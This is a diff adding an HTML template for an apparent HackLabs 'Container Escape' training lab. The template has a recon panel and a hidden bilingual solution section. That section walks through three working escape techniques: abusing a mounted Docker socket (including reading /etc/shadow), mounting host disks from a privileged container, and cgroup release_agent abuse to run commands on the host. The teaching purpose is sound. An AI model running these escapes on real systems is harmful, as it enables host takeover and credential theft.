@@ -1,0 +1,219 @@
+{% extends "base.html" %}
+{% block title %}Container Escape – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}{% for category, msg in messages %}
+      <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg }}</div>
+    {% endfor %}{% endif %}
+  {% endwith %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-4" data-i18n="container_recon">Container Recon</h2>
+
+    <div class="grid grid-cols-1 gap-2 sm:grid-cols-2">
+      <!-- in_container -->
+      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_in">Running in container</span>
+        {% if checks and checks.in_container %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">DETECTED</span>
+        {% else %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">SAFE</span>
+        {% endif %}
+      </div>
+
+      <!-- docker_socket -->
+      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_socket">/var/run/docker.sock</span>
+        {% if checks and checks.docker_socket %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">EXPOSED</span>
+        {% else %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">ABSENT</span>
+        {% endif %}
+      </div>
+
+      <!-- running_as_root -->
+      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_root">Running as root</span>
+        {% if checks and checks.running_as_root %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
+        {% else %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
+        {% endif %}
+      </div>
+
+      <!-- privileged -->
+      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_priv">Privileged mode</span>
+        {% if checks and checks.privileged %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
+        {% else %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
+        {% endif %}
+      </div>
+
+      <!-- writable_host_path -->
+      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_hostpath">Writable host path mounted</span>
+        {% if checks and checks.writable_host_path %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
+        {% else %}
+        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
+        {% endif %}
+      </div>
+
+      <!-- id_output -->
+      <div class="rounded-lg px-3 py-2.5 sm:col-span-2"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1" data-i18n="container_check_id">id output</div>
+        <code class="text-xs font-mono" style="color:var(--hl-primary)">{{ checks.id_output if checks else 'uid=0(root) gid=0(root) groups=0(root)' }}</code>
+      </div>
+
+      <!-- cap_eff -->
+      <div class="rounded-lg px-3 py-2.5 sm:col-span-2"
+           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1" data-i18n="container_check_cap">CapEff (effective capabilities)</div>
+        <code class="text-xs font-mono" style="color:var(--hl-primary)">{{ checks.cap_eff if checks else '0000003fffffffff' }}</code>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Docker Socket Escape</h3>
+    <p>El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.</p>
+    <ol>
+      <li>Verifica que el socket existe:
+        <pre>ls -la /var/run/docker.sock</pre>
+      </li>
+      <li>Monta el filesystem del host en un nuevo contenedor y haz chroot:
+        <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
+      </li>
+      <li>O lee directamente archivos sensibles del host:
+        <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
+      </li>
+      <li>Desde dentro del chroot tienes acceso completo al host. Lee la flag:
+        <pre>cat /root/flag.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Privileged Container Escape</h3>
+    <p>El contenedor corre en modo privileged. Tiene acceso a todos los dispositivos del host.</p>
+    <ol>
+      <li>Comprueba las capacidades efectivas:
+        <pre>cat /proc/self/status | grep CapEff
+# Si CapEff != 0000000000000000 → privileged</pre>
+      </li>
+      <li>Lista los discos del host y monta el disco principal:
+        <pre>fdisk -l
+mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk</pre>
+      </li>
+      <li>Haz chroot al disco del host para obtener una shell con acceso completo:
+        <pre>chroot /tmp/hostdisk</pre>
+      </li>
+      <li>Lee la flag:
+        <pre>cat /root/flag.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Cgroup release_agent abuse</h3>
+    <p>Técnica avanzada que usa cgroups para ejecutar comandos en el host sin montar discos.</p>
+    <ol>
+      <li>Crea un cgroup y configura el release_agent para apuntar a un script en el host:
+        <pre>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
+      </li>
+      <li>Crea el script que se ejecutará en el host:
+        <pre>echo '#!/bin/sh' &gt; /cmd
+echo "id &gt; ${host_path}/output" &gt;&gt; /cmd
+chmod a+x /cmd</pre>
+      </li>
+      <li>Dispara la ejecución añadiendo un proceso al cgroup y matándolo:
+        <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+cat /output</pre>
+      </li>
+      <li>Adapta el script para leer la flag o lanzar una reverse shell:
+        <pre>echo "cat /root/flag.txt &gt; ${host_path}/output" &gt;&gt; /cmd</pre>
+      </li>
+    </ol>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Docker Socket Escape</h3>
+    <p>The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.</p>
+    <ol>
+      <li>Verify the socket exists:
+        <pre>ls -la /var/run/docker.sock</pre>
+      </li>
+      <li>Mount the host filesystem into a new container and chroot:
+        <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
+      </li>
+      <li>Or read sensitive host files directly:
+        <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
+      </li>
+      <li>Inside the chroot you have full host access. Read the flag:
+        <pre>cat /root/flag.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Privileged Container Escape</h3>
+    <p>The container runs in privileged mode. It has access to all host devices.</p>
+    <ol>
+      <li>Check effective capabilities:
+        <pre>cat /proc/self/status | grep CapEff
+# If CapEff != 0000000000000000 → privileged</pre>
+      </li>
+      <li>List host disks and mount the main disk:
+        <pre>fdisk -l
+mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk</pre>
+      </li>
+      <li>Chroot into the host disk to get a shell with full access:
+        <pre>chroot /tmp/hostdisk</pre>
+      </li>
+      <li>Read the flag:
+        <pre>cat /root/flag.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Cgroup release_agent abuse</h3>
+    <p>Advanced technique using cgroups to execute commands on the host without mounting disks.</p>
+    <ol>
+      <li>Create a cgroup and configure the release_agent to point to a script on the host:
+        <pre>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
+      </li>
+      <li>Create the script that will run on the host:
+        <pre>echo '#!/bin/sh' &gt; /cmd
+echo "id &gt; ${host_path}/output" &gt;&gt; /cmd
+chmod a+x /cmd</pre>
+      </li>
+      <li>Trigger execution by adding a process to the cgroup and killing it:
+        <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+cat /output</pre>
+      </li>
+      <li>Adapt the script to read the flag or launch a reverse shell:
+        <pre>echo "cat /root/flag.txt &gt; ${host_path}/output" &gt;&gt; /cmd</pre>
+      </li>
+    </ol>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+  </div>
+</div>
+{% endblock %}
